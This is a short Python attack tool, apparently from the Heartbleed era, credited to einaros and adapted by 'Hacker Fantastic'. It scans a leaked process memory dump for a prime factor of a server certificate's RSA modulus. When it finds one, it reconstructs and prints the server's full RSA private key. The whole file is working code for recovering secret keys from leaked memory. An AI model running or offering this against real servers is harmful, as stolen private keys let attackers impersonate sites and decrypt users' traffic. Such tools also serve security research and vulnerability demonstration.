#!/usr/bin/env python3
"""  
Traverse memory dump, looking for prime factors.  
Author: Einar Otto Stangvik / @einaros / https://hacking.ventures
Environment: Python 3

Fixed for 44cafe by Hacker Fantastic
"""  
from __future__ import print_function
import sys, struct, subprocess, binascii, re, base64
import gmpy 
from pyasn1.codec.der import encoder
from pyasn1.type.univ import *

def get_modulus(cert_path):
  return subprocess.Popen(
    ['openssl', 'x509', '-noout', '-in', cert_path, '-modulus'], 
    stdout = subprocess.PIPE, 
    stderr = subprocess.PIPE
    ).communicate()[0].split(b'=')[1]

def long(data, offset, size):
  n = 0
  for i in range(size):
    n |= data[offset+i] << (8*i)
  return n
    
def main(cert_path, data_path):
  mod = get_modulus(cert_path)
  mod = int(mod, 16)
  key_size = int(mod.bit_length() / 16)
  print('Key size: %d'%key_size)
  with open(data_path, 'rb') as f:
    data = f.read()
  print('Data length: %d'%len(data))
  length = len(data) - key_size
  for i in range(length):
    if i % 100000 == 0:
      sys.stdout.write(chr(27) + '[%dG'%(1) + chr(27) + '[0K')
      sys.stdout.write('Progress: %d%%'%(100.0*i/length))
      sys.stdout.flush()
    if data[i] % 2 == 0:
      continue
    p = long(data, i, key_size)
    mod
    if p != 0 and p != 1 and p != mod and mod % p == 0:
      sys.stdout.write(chr(27) + '[%dG'%(1) + chr(27) + '[0K')
      q = gmpy.divexact(mod,p)
      print('%s Offset 0x%x:\nq = %s\np = %d\n'%(data_path, i, p, q))
      n = gmpy.mpz(mod)
      q2 = gmpy.mpz(p)
      e = gmpy.mpz(65537)
      p2 = gmpy.mpz(q)
      phi = (p2-1) * (q2-1)
      d = gmpy.invert(e, phi)
      dp = d % (p2 - 1)
      dq = d % (q2 - 1)
      qinv = gmpy.invert(q2, p2)
      seq = Sequence()
      for x in [0, mod, e, d, p2, q2, dp, dq, qinv]:
        seq.setComponentByPosition (len (seq), Integer (x))
      print("\n\n-----BEGIN RSA PRIVATE KEY-----\n%s-----END RSA PRIVATE KEY-----\n\n"%base64.encodestring(encoder.encode(seq)).decode('ascii'))
      sys.exit(0)
  sys.stdout.write(chr(27) + '[%dG'%(1) + chr(27) + '[0K')
    
if __name__ == '__main__':
  sys.exit(main(*sys.argv[1:]))
